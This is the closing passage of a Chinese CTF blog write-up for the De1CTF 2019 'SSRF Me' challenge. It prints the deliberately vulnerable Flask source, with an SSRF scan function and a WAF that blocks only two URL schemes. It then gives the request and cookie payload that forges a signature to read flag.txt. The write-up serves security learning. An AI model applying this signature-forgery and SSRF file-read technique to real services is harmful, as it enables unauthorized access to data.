class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br></pre></td><td class="code"><pre><span class="line">#! /usr/bin/env python</span><br><span class="line"># #encoding=utf-8</span><br><span class="line">from flask import Flask</span><br><span class="line">from flask import request</span><br><span class="line">import socket</span><br><span class="line">import hashlib</span><br><span class="line">import urllib</span><br><span class="line">import sys</span><br><span class="line">import os</span><br><span class="line">import json</span><br><span class="line">reload(sys)</span><br><span class="line">sys.setdefaultencoding(&#x27;latin1&#x27;)</span><br><span class="line"> </span><br><span class="line">app = Flask(__name__)</span><br><span class="line"> </span><br><span class="line">secert_key = os.urandom(16)</span><br><span class="line"> </span><br><span class="line">class Task:</span><br><span class="line">    def __init__(self, action, param, sign, ip):</span><br><span class="line">        self.action = action</span><br><span class="line">        self.param = param</span><br><span class="line">        self.sign = sign</span><br><span class="line">        self.sandbox = md5(ip)</span><br><span class="line">        if(not os.path.exists(self.sandbox)):</span><br><span class="line">            os.mkdir(self.sandbox)</span><br><span class="line"> </span><br><span class="line">    def Exec(self):</span><br><span class="line">        result = &#123;&#125;</span><br><span class="line">        result[&#x27;code&#x27;] = 500</span><br><span class="line">        if (self.checkSign()):</span><br><span class="line">            if &quot;scan&quot; in self.action:</span><br><span class="line">                tmpfile = open(&quot;./%s/result.txt&quot; % self.sandbox, &#x27;w&#x27;)</span><br><span class="line">                resp = scan(self.param)</span><br><span class="line">                if (resp == &quot;Connection Timeout&quot;):</span><br><span class="line">                    result[&#x27;data&#x27;] = resp</span><br><span class="line">                else:</span><br><span class="line">                    print resp</span><br><span class="line">                    tmpfile.write(resp)</span><br><span class="line">                    tmpfile.close()</span><br><span class="line">                result[&#x27;code&#x27;] = 200</span><br><span class="line">            if &quot;read&quot; in self.action:</span><br><span class="line">                f = open(&quot;./%s/result.txt&quot; % self.sandbox, &#x27;r&#x27;)</span><br><span class="line">                result[&#x27;code&#x27;] = 200</span><br><span class="line">                result[&#x27;data&#x27;] = f.read()</span><br><span class="line">            if result[&#x27;code&#x27;] == 500:</span><br><span class="line">                result[&#x27;data&#x27;] = &quot;Action Error&quot;</span><br><span class="line">        else:</span><br><span class="line">            result[&#x27;code&#x27;] = 500</span><br><span class="line">            result[&#x27;msg&#x27;] = &quot;Sign Error&quot;</span><br><span class="line">        return result</span><br><span class="line"> </span><br><span class="line">    def checkSign(self):</span><br><span class="line">        if (getSign(self.action, self.param) == self.sign):</span><br><span class="line">            return True</span><br><span class="line">        else:</span><br><span class="line">            return False</span><br><span class="line"> </span><br><span class="line">@app.route(&quot;/geneSign&quot;, methods=[&#x27;GET&#x27;, &#x27;POST&#x27;])</span><br><span class="line">def geneSign():</span><br><span class="line">    param = urllib.unquote(request.args.get(&quot;param&quot;, &quot;&quot;))</span><br><span class="line">    action = &quot;scan&quot;</span><br><span class="line">    return getSign(action, param)</span><br><span class="line"> </span><br><span class="line">@app.route(&#x27;/De1ta&#x27;,methods=[&#x27;GET&#x27;,&#x27;POST&#x27;])</span><br><span class="line">def challenge():</span><br><span class="line">    action = urllib.unquote(request.cookies.get(&quot;action&quot;))</span><br><span class="line">    param = urllib.unquote(request.args.get(&quot;param&quot;, &quot;&quot;))</span><br><span class="line">    sign = urllib.unquote(request.cookies.get(&quot;sign&quot;))</span><br><span class="line">    ip = request.remote_addr</span><br><span class="line">    if(waf(param)):</span><br><span class="line">        return &quot;No Hacker!!!!&quot;</span><br><span class="line">    task = Task(action, param, sign, ip)</span><br><span class="line">    return json.dumps(task.Exec())</span><br><span class="line"> </span><br><span class="line">@app.route(&#x27;/&#x27;)</span><br><span class="line">def index():</span><br><span class="line">    return open(&quot;code.txt&quot;,&quot;r&quot;).read()</span><br><span class="line"> </span><br><span class="line">def scan(param):</span><br><span class="line">    socket.setdefaulttimeout(1)</span><br><span class="line">    try:</span><br><span class="line">        return urllib.urlopen(param).read()[:50]</span><br><span class="line">    except:</span><br><span class="line">        return &quot;Connection Timeout&quot;</span><br><span class="line"> </span><br><span class="line">def getSign(action, param):</span><br><span class="line">    return hashlib.md5(secert_key + param + action).hexdigest()</span><br><span class="line"> </span><br><span class="line">def md5(content):</span><br><span class="line">    return hashlib.md5(content).hexdigest()</span><br><span class="line"> </span><br><span class="line">def waf(param):</span><br><span class="line">    check=param.strip().lower()</span><br><span class="line">    if check.startswith(&quot;gopher&quot;) or check.startswith(&quot;file&quot;):</span><br><span class="line">        return True</span><br><span class="line">    else:</span><br><span class="line">        return False</span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    app.debug = False</span><br><span class="line">    app.run(host=&#x27;0.0.0.0&#x27;,port=9999)</span><br></pre></td></tr></table></figure>
+
+<p>看起来挺复杂的，但核心其实就两个路由：<code>/geneSign</code>和<code>/De1ta</code>。我们发现<code>/geneSign</code>路由是将<code>param</code>和<code>action</code>拼接而成的，接着返回到<code>getSign()</code>中，进行md5加密。</p>
+<p>接着是<code>/De1ta</code>路由，在这个路由中获取三个变量，GET获取param，Cookie获取action和sign，在检查的时候要满足<code>getSign(self.action, self.param) == self.sign</code>。</p>
+<p>因此我们这样构建payload，首先：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">/geneSign?param=flag.txtread</span><br><span class="line"></span><br><span class="line">//175fadbcd603662b8637028cae3aaf1e</span><br></pre></td></tr></table></figure>
+
+<p>这样相当于我们获得了一个<code>flag.txtreadscan</code>的sign值，接着：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/De1ta?param=flag.txt</span><br><span class="line">Cookie: action=readscan;sign=175fadbcd603662b8637028cae3aaf1e</span><br></pre></td></tr></table></figure>
+
+<p>这相当于我们的<code>getSign(self.action, self.param)</code>为<code>flag.txt+readscan</code>，和sign对应上了，而这样又能将param中文件内容读出并返回给我们，以此获取flag。</p>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/web-write-up-ctf/" rel="tag"># -web -write up -ctf</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2022/03/05/%E7%89%B9%E6%AE%8Awebshell%E7%9A%84%E6%9E%84%E5%BB%BA/" rel="next" title="特殊webshell的构建">
+                <i class="fa fa-chevron-left"></i> 特殊webshell的构建
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            Table of Contents
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            Overview
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <p class="site-author-name" itemprop="name"></p>
+              <p class="site-description motion-element" itemprop="description"></p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives%7C%7C%20archive">
+              
+                  <span class="site-state-item-count">51</span>
+                  <span class="site-state-item-name">posts</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-categories">
+                <a href="/categories/index.html">
+                  <span class="site-state-item-count">3</span>
+                  <span class="site-state-item-name">categories</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">24</span>
+                  <span class="site-state-item-name">tags</span>
+                </a>
+              </div>
+            
+
+          </nav>
+
+          
+            <div class="feed-link motion-element">
+              <a href="/atom.xml" rel="alternate">
+                <i class="fa fa-rss"></i>
+                RSS
+              </a>
+            </div>
+          
+
+          
+
+          
+          
+
+          
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%89%8D%E8%A8%80"><span class="nav-number">1.</span> <span class="nav-text">前言</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#GXYCTF2019-%E7%A6%81%E6%AD%A2%E5%A5%97%E5%A8%83"><span class="nav-number"></span> <span class="nav-text">[GXYCTF2019]禁止套娃</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-RCE-ME"><span class="nav-number"></span> <span class="nav-text">[极客大挑战 2019]RCE ME</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#MRCTF2020-%E5%A5%97%E5%A8%83"><span class="nav-number"></span> <span class="nav-text">[MRCTF2020]套娃</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E7%BA%A2%E6%98%8E%E8%B0%B7CTF-2021-write-shell"><span class="nav-number"></span> <span class="nav-text">[红明谷CTF 2021]write_shell</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#GYCTF2020-FlaskApp"><span class="nav-number"></span> <span class="nav-text">[GYCTF2020]FlaskApp</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#WesternCTF2018-shrine"><span class="nav-number"></span> <span class="nav-text">[WesternCTF2018]shrine</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#De1CTF-2019-SSRF-Me"><span class="nav-number"></span> <span class="nav-text">[De1CTF 2019]SSRF Me</span></a></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2022</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">liszt_lin</span>
+
+  
+</div>
+
+
+  <div class="powered-by">Powered by <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a></div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">Theme &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Pisces</a> v5.1.4</div>
+
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.4"></script>
+
+
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
